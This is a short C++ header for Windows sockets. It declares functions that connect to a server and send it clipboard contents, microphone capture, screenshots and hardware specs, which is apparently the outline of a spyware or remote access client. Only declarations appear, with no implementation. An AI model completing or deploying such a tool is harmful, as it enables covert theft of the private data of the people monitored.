#pragma once

#include <WinSock2.h>
#pragma comment(lib,"Ws2_32.lib")

class wsaWrapper
{
	WSADATA wsa;
	int res = 0;
	
public:
	wsaWrapper();
	~wsaWrapper();
};

namespace network {
	SOCKET srvSOCKET = INVALID_SOCKET;
	int _connect(std::string, short PORT);
	int _sendClipbord();
	int _captureMic();
	int _sendScrShot();
	int _sendHWSpecs();
}